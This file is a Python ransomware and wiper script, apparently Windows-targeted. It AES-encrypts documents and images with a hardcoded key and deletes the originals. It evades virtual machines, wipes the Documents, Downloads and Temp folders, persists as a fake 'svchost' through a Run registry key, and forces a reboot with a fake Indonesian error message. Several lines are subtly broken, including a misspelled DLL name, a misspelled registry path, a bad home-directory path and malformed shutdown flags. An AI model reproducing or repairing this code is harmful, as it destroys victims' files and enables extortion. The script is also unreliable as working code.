import os
import sys
import base64
import ctypes
import random
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def get_key():
    
    return base64.b64decode("U2VjcmV0S2V5MTIzNDU2Nzg=").decode()
def is_vm():
    try:
        return ctypes.windll.kernell32.GetModuleHandleW("vm3dgl.dll") != 0
    except:
        return False
    
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        cipher = AES.new(key.encode(), AES.MODE_CBC, iv=os.urandom(16))
        encryted = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path + ".encrypted", 'wb') as f:
            f.write(encryted)
        os.remove(file_path)
    except:
        pass
def corrupt_system():
    targets = [
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Downloads"),
        "C:\\Windows\Temp",
    ]
    
    for target in targets:
        try:
            if os.path.isdir(target):
                shutil.rmtree(target, ignore_errors=True)
            elif os.path.isfile(target):
                os.remove(target)
        except:
            continue
        malware_path = os.path.join(os.environ["APPDATA"], "svchost exe")
        if not os.path.exists(malware_path):
            shutil.copyfile(sys.argv[0], malware_path)
            os.system(f'reg add HCKU\\Sofware\\Microsoft\\Windows\\CurrentVersion\Run /v "SystemGuard" /t REG_SZ /d "{malware_path}" /f')
            
def main():
    if is_vm():
        sys.exit(0)
    key = get_key()
    for root, _, files in os.walk(os.path.expanduser("-")):
        for file in files:
            if file.endswith((".docx", ".pdf", "jpg", "xlsx")):
                encrypt_file(os.path.join(root, file), key)
    
    corrupt_system()
    os.system("shutdown /r/ /t/ 10 /c 'Windows Menemukan Kesalahan Kristis.'")

if __name__ == "__main__":
    main()